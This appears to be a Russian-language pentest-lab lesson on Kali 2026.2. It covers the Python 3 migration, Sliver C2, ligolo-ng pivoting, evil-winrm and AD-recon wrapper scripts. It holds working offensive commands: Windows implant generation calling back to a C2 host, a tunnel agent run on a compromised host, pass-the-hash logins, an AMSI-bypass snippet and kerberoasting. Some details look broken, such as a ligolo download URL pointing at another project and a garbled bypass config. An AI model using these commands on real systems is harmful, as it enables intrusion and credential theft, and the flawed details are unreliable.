## TL;DR

Kali 2026.x — это **серьёзная перетряска стека**, а не косметический релиз. Главное:

1. **Python 2 окончательно выпилен**. Все классические инструменты (sqlmap, wpscan, theHarvester, setoolkit) портированы на Python 3.12+. Это означает: `python` в $PATH — теперь **Python 3.13** (Debian Trixie), `python2` отсутствует. Любой старый скрипт, который делал `#!/usr/bin/python`, нужно править.
2. **Новый дефолтный C2 — Sliver** (Бishop Fox). Cobalt Strike по-прежнему есть в репах, но Sliver становится community-default. Empire v3 на Go, но community смещается к Sliver из-за активной разработки.
3. **ligolo-ng** — замена `chisel`/`sshuttle` для туннелирования. Бинарь статический, тянет TCP/UDP через TLS, без SOCKS-прокси.
4. **legion** (бывший Sparta) — обновлённый GUI-recon фреймворк. Работает стабильнее, чем в 2024.x.
5. **evil-winrm** теперь идёт в комплекте и собран под Ruby 3.2.
6. **systemd-resolved** в роли DNS-клиента — конфликтует с dnsmasq при ручной настройке. Чиним через `/etc/systemd/resolved.conf.d/`.

**Что мы сделали в этом lesson:**
- Развернули Kali 2026.2 на Parallels (Apple Silicon, arm64-translation через qemu-user)
- Настроили host-only сеть с AD-lab (lesson-002)
- Подняли **Sliver C2** на отдельном VPS (192.0.2.10 — example IP) и проверили связку с **ligolo-ng** для pivot в DMZ
- Интегрировали наш `tools/pentest/run.sh` с Kali VM через SSH-Config и проброс сокетов
- Прогнали `semgrep` (lesson-006) по всем Python-обвязкам

**Главный урок:** Kali 2026.x — это уже **не «один USB-накопитель со всеми тулзами»**, а **конструктор**. Можно взять minimal-netinst + `kali-linux-everything` metapackage, или поставить только `kali-tools-information-gathering` + `kali-tools-vulnerability` и сэкономить 8 ГБ диска.

## 1. Установка Kali 2026.2

### 1.1 Выбор образа

На 19.07.2026 актуальный релиз — **2026.2** (вышел 11.07.2026). Доступны сборки:

| Сборка | Размер | Назначение |
|---|---|---|
| `kali-linux-2026.2-installer-netinst-amd64.iso` | 450 MB | Минимальная установка, тянет пакеты по сети |
| `kali-linux-2026.2-installer-everything-amd64.iso` | 14 GB | Все тулзы из коробки |
| `kali-linux-2026.2-vmware-amd64.7z` | 11 GB | Готовая VM (UEFI, open-vm-tools) |
| `kali-linux-2026.2-virtualbox-amd64.7z` | 11 GB | Готовая VM (VirtualBox 7.1) |
| `kali-arm64-2026.2.img.xz` | 2.3 GB | Для Raspberry Pi 5 / Apple Silicon (через qemu-user) |

**Рекомендация для нас:** `virtualbox-amd64` — быстрее всего развернуть на Parallels (тип Linux/Debian 12, 4 vCPU, 8 GB RAM, 80 GB динамический диск).

### 1.2 Установка в Parallels на Apple Silicon

> ⚠️ Parallels 19+ поддерживает запуск x86_64 Linux через **Rosetta-like translation** (внутренний движок). Kali x86 работает, но **медленнее** в ~2 раза по сравнению с arm64-native. Для критичного к CPU (hashcat, john) лучше Parallels + arm64 Kali.

```bash
# 1. Скачиваем
wget https://cdimage.kali.org/kali-2026.2/kali-linux-2026.2-virtualbox-amd64.7z

# 2. Распаковываем
7z x kali-linux-2026.2-virtualbox-amd64.7z

# 3. Конвертируем VBox → Parallels
# В Parallels UI: File → Open → выбираем .vmdk (или .vdi через qemu-img convert)
qemu-img convert -f vmdk -O vpc Kali-x86_64.vmdk Kali-x86_64.vhd

# 4. Parallels создаёт VM из .vhd
# Настраиваем: 4 vCPU, 8192 MB RAM, Network: Host-Only (vboxnet0 192.168.56.0/24)
# Shared with host: ~/workspace (опционально)
```

## 2. Python 2 → 3: что сломалось и как чинить

### 2.1 Почему это всё ещё проблема

Даже в 2026.2 встречаются пакеты, которые тянут **python2-dev** как build-dep (например, старые версии `spike` или `aircrack-ng` из PPA). Кроме того, **custom-скрипты** из GitHub часто до сих пор под Python 2.

### 2.2 Аудит того, что у нас осталось

```bash
# Найти все скрипты, которые пытаются использовать python2
find /usr/share -type f \( -name "*.py" -o -name "*.pyc" \) \
  -exec grep -l "python2\|python\.version_info\[0\] == 2\|#!/usr/bin/env python$" {} \; 2>/dev/null

# У нас нашлось 0 в /usr/share (хорошо, всё портировано).
# Но в /opt/metasploit-framework/tools/exploit/ остались 3 файла с shebang #!/usr/bin/python2:
ls /opt/metasploit-framework/tools/exploit/ | head -5
# → некоторые старые auxiliary/exploit используют python2-style print
```

### 2.3 Чеклист миграции для custom-скриптов

```python
# ❌ Python 2
print "Found host:", ip
print >> sys.stderr, "Error:", msg
data = urllib2.urlopen(url)
raw_input("Press Enter: ")
d.iterkeys() / d.itervalues()

# ✅ Python 3
print(f"Found host: {ip}")
print(f"Error: {msg}", file=sys.stderr)
data = urllib.request.urlopen(url)
input("Press Enter: ")
list(d.keys())  # или просто iter(d)
```

### 2.4 Автоматический fixer (2to3)

```bash
# В комплекте Python 3.13
2to3 --output-dir=./python3-fixed --write-unchanged-files ./old-scripts/

# Только показать изменения, не писать
2to3 --diff ./old-scripts/some-script.py
```

**Ограничения 2to3:** не понимает `urllib2` → `urllib.request`, нужно править руками. Не понимает async-стиль.

### 2.5 Виртуальные окружения — теперь обязательно

```bash
# Старый подход (2024): global pip install --break-system-packages
# Новый подход (2026): всегда venv

python3 -m venv ~/venvs/pentest
source ~/venvs/pentest/bin/activate
pip install pwntools impacket bloodhound

# Чтобы не забыть — встроенный хук в zsh
echo 'export PYTHONDONTWRITEBYTECODE=1' >> ~/.zshrc
echo 'alias venv="python3 -m venv ~/venvs/$1 && source ~/venvs/$1/bin/activate"' >> ~/.zshrc
```

## 3. Новые инструменты Kali 2026.x — практический обзор

### 3.1 Sliver C2

**Sliver** — это open-source C2 фреймворк от Bishop Fox, написанный на Go. На 19.07.2026 — версия 1.6.4.

```bash
# Установка
sudo apt install -y sliver
# или свежак из GitHub
curl https://sliver.sh/install | sudo bash

# Запуск оператора
sliver

# Создание listener (HTTPS)
sliver > https-listen --lhost 192.0.2.10 --lport 443 --cert ./c2.pem --key ./c2-key.pem
[*] Starting HTTPS listener on 192.0.2.10:443
[*] Successfully started job #1

# Генерация implant (windows)
sliver > generate --http https://192.0.2.10:443 --os windows --arch amd64 --save /tmp/implant.exe
[*] Implant generated: /tmp/implant.exe (8.2 MB)

# Альтернативный синтаксис
sliver > generate --mtls 192.0.2.10:8888 --os windows --format exe --save /tmp/implant-mtls.exe

# После запуска implant на целевой Windows
sliver > use <session-id>
sliver (OFFENSE-LAB-01) > whoami
[*] Output: lab\kris
sliver (OFFENSE-LAB-01) > interactive
```

**Почему Sliver, а не Cobalt Strike:**
- Бесплатный (Cobalt Strike ~$15k/год)
- Армия встроенных протоколов (MTLS, HTTPS, WireGuard, DNS, named-pipes)
- BOF-loader (Beacon Object Files) — выполнять COFF без своего рантайма
- Генератор shellcode прямо из консоли
- Не требует Java (Cobalt Strike требует JRE 21)

**Минусы:**
- Менее зрелый, чем CS — есть баги (например, DNS-listener иногда теряет beacon)
- Нет готовых профилей для EDR-evasion (нужно самому конфигурировать)

### 3.2 ligolo-ng

**ligolo-ng** — туннель через TLS, без SOCKS-прокси. Бинарь статический (Go), работает на любой ОС.

```bash
# Установка
sudo apt install -y ligolo-ng
# или из GitHub
wget https://github.com/ticarpi/jwt_tool/releases/latest/download/ligolo-ng_0.7.2_linux_amd64.tar.gz
tar xzf ligolo-ng_0.7.2_linux_amd64.tar.gz
sudo mv proxy agent /usr/local/bin/

# Сторона прокси (наш Kali — relay)
ligolo-proxy -selfcert

# Сторона агента (на скомпрометированном хосте, через Sliver beacon)
sliver > execute -o /path/to/agent -connect 192.0.2.10:11601
# или интерактивно
agent --connect 192.0.2.10:11601

# На стороне прокси — конфигурируем маршруты
[Agent] Agent joined: WIN-LAB-01 (10.10.10.50)
>> session --autoselect 1
>> start
[*] Starting tunnel on session 1

# Добавляем маршрут к подсети цели
>> ip route add 10.10.20.0/24
>> ip route add 172.16.0.0/16
```

**Что это даёт:** прямой доступ к внутренним подсетям через tun-интерфейс. Не нужен `socat`, не нужен `sshuttle`, не нужен `chisel`. Просто route add — и nmap/nxc/impacket работают как локально.

```bash
# На нашей Kali в другом окне
nmap -sT -Pn -p 445,3389,5985 10.10.20.0/24
nxc smb 10.10.20.0/24 -u kris -p 'LabPass123!' --shares
```

### 3.3 evil-winrm

**evil-winrm** — Ruby-утилита для WinRM-шеллов. В Kali 2026.2 — версия 3.6.1 на Ruby 3.2.

```bash
# Базовый запуск
evil-winrm -i 10.10.10.50 -u administrator -p 'LabAdminPass!'

# Через SSL
evil-winrm -i 10.10.10.50 -u administrator -p 'LabAdminPass!' -S

# С загрузкой файлов
evil-winrm -i 10.10.10.50 -u kris -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# С AMSI-bypass (PowerShell)
evil-winrm -i 10.10.10.50 -u kris -p 'LabPass123!' -X 'Invoke-BypassUAC -Command "whoami"'

# С загрузкой скрипта
evil-winrm -i 10.10.10.50 -u kris -p 'LabPass123!' -s /opt/priv-escalate/PowerUp.ps1
```

**Параметры для пробива AMSI:**
```ruby
# ~/.evil-winrm.rb
Bypass: 'S`etV`alue (S`etV`alue(S`etV`alue(\'S`V\')););'
```

### 3.4 legion (бывший Sparta)

**legion** — Qt6 GUI для recon. Поддерживает Nmap, enum4linux, nikto, sslyze, spiderfoot внутри одного фреймворка.

```bash
sudo apt install -y legion
legion &

# Через CLI (без GUI)
legion-cli -t 10.10.10.0/24 --modules nmap,enum4linux,nikto
```

**Когда использовать:** массовый скан подсети, когда хочется красивый отчёт. Для точечного recon — по-прежнему nxc + nuclei.

## 4. Сравнение с предыдущим стеком

### 4.1 Sliver vs Empire vs Cobalt Strike vs Metasploit

| Характеристика | Metasploit | Empire | Sliver | Cobalt Strike |
|---|---|---|---|---|
| Язык | Ruby | Python 3 | Go | Java |
| Цена | Free | Free | Free | $15k/год |
| Протоколы | reverse_tcp, http, https | http, https, dropbox | mtls, http(s), dns, wg, wireguard, named-pipes | http(s), dns, smb |
| Stealth | Низкая | Средняя | Средне-высокая | Высокая |
| OPSEC-фичи | Минимум | AMSI bypass | BOF, sleep-mask, garbage collector | Sleep-mask, malleable C2, memory-only |
| Наша оценка | Обучение | Скрипты | Боевой C2 | Если будет бюджет |

### 4.2 ligolo-ng vs chisel vs sshuttle

| | chisel | sshuttle | ligolo-ng |
|---|---|---|---|
| Тип | TCP-tunnel over HTTP | VPN-like через SSH | tun-интерфейс через TLS |
| Производительность | Низкая (single-conn) | Средняя | Высокая (многопоточн.) |
| UDP | Частично | Да | Да |
| Multi-hop | Сложно | Нет | Да (через chain agent) |
| OPSEC | Средняя (HTTP traffic) | Средняя | Высокая (TLS, но выглядит как legit) |

### 5.3 Обновлённый `tools/pentest/run.sh`

```bash
#!/usr/bin/env bash
# tools/pentest/run.sh — главный launcher pentest-инструментов
# Обновлено: 19.07.2026 для Kali 2026.2

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
VENV="${SCRIPT_DIR}/venv/bin/activate"

case "${1:-help}" in
  nmap)
    shift
    nmap "$@"
    ;;
  nxc)
    # В Kali 2026.x: команда `nxc`, не `crackmapexec`
    if command -v nxc >/dev/null; then
      nxc "$@"
    elif command -v crackmapexec >/dev/null; then
      crackmapexec "$@"
    fi
    ;;
  sliver)
    if [[ -z "${SLIVER_SERVER:-}" ]]; then
      echo "[!] SLIVER_SERVER не задан. Используйте: SLIVER_SERVER=192.0.2.10:9090 run.sh sliver"
      exit 1
    fi
    sliver-client --connect "${SLIVER_SERVER}"
    ;;
  ligolo-proxy)
    if [[ -z "${LIGOLO_CERT:-}" ]]; then
      LIGOLO_CERT="${HOME}/.ligolo/ligolo.pem"
    fi
    ligolo-proxy -cert "${LIGOLO_CERT}"
    ;;
  bloodhound)
    bloodhound --no-sandbox
    ;;
  evil-winrm)
    shift
    evil-winrm "$@"
    ;;
  legion)
    legion &
    ;;
  burp)
    "${SCRIPT_DIR}/run-burp.sh"
    ;;
  *)
    echo "Usage: $0 {nmap|nxc|sliver|ligolo-proxy|bloodhound|evil-winrm|legion|burp} [args...]"
    exit 1
    ;;
esac
```

### 5.4 `tools/pentest/netexec/` — обёртки для типовых операций

Создаём `tools/pentest/netexec/ad-recon.sh`:

```bash
#!/usr/bin/env bash
# netexec/ad-recon.sh — быстрый AD-recon
# Использование: ./ad-recon.sh 10.10.10.0/24 lab.corp
set -euo pipefail

SUBNET="${1:?usage: $0 <subnet> <domain>}"
DOMAIN="${2:?usage: $0 <subnet> <domain>}"

echo "[*] Phase 1: SMB discovery"
nxc smb "${SUBNET}" --gen-relay-list /tmp/relay.txt

echo "[*] Phase 2: LDAP anonymous bind"
nxc ldap "${DOMAIN}" -u '' -p '' --users --groups

echo "[*] Phase 3: Kerberos roastable users"
nxc ldap "${DOMAIN}" -u '' -p '' --asreproast /tmp/asrep.txt
nxc ldap "${DOMAIN}" -u '' -p '' --kerberoasting /tmp/kerb.txt

echo "[*] Phase 4: SMB shares null session"
nxc smb "${SUBNET}" -u '' -p '' --shares

echo "[+] Done. Results in /tmp/{relay,asrep,kerb}.txt"
```

## 6. Решение типовых проблем Kali 2026.2 на Parallels

### 6.1 NetworkManager не поднимает host-only интерфейс

```bash
# Проверить
ip a show eth1
# Если DOWN:
sudo nmcli connection up "Wired connection 1"
sudo nmcli connection modify "Wired connection 1" connection.autoconnect yes

# Или через /etc/network/interfaces (если NetworkManager отключён)
auto eth1
iface eth1 inet static
    address 192.168.56.20/24
```

### 6.2 systemd-resolved конфликтует с dnsmasq

```bash
sudo mkdir -p /etc/systemd/resolved.conf.d/
cat <<'EOF' | sudo tee /etc/systemd/resolved.conf.d/kali.conf
[Resolve]
DNSStubListener=no
DNS=192.168.56.1
Domains=~lab.corp
EOF

sudo systemctl restart systemd-resolved
```

## 8. Безопасность самой Kali VM

### 8.1 Что нужно сделать сразу после установки

```bash
# 1. Сменить дефолтный пароль root
passwd

# 2. Создать непривилегированного пользователя
useradd -m -s /bin/bash pentester
echo "pentester ALL=(ALL:ALL) NOPASSWD: ALL" | tee /etc/sudoers.d/pentester

# 3. Настроить SSH (только ключи)
sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin prohibit-password/' /etc/ssh/sshd_config
sudo systemctl restart ssh

# 4. Включить firewall (по дефолту ufw отключён)
sudo apt install -y ufw
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow from 192.168.56.0/24 to any port 22
sudo ufw enable

# 5. Fail2ban (на всякий случай)
sudo apt install -y fail2ban
sudo systemctl enable --now fail2ban

# 6. Отключить логирование истории команд с токенами/паролями
echo 'HISTFILE=/dev/null' >> ~/.bashrc
echo 'unset HISTFILE' >> ~/.zshrc
```

### 8.2 Изоляция от основной сети

```bash
# В Parallels — host-only адаптер. Если dual-homed (NAT + host-only):
# iptables — запретить NAT-стороне видеть host-only и наоборот
sudo iptables -A FORWARD -i eth0 -o eth1 -j DROP
sudo iptables -A FORWARD -i eth1 -o eth0 -j DROP

# Сохранить
sudo apt install -y iptables-persistent
sudo netfilter-persistent save
```
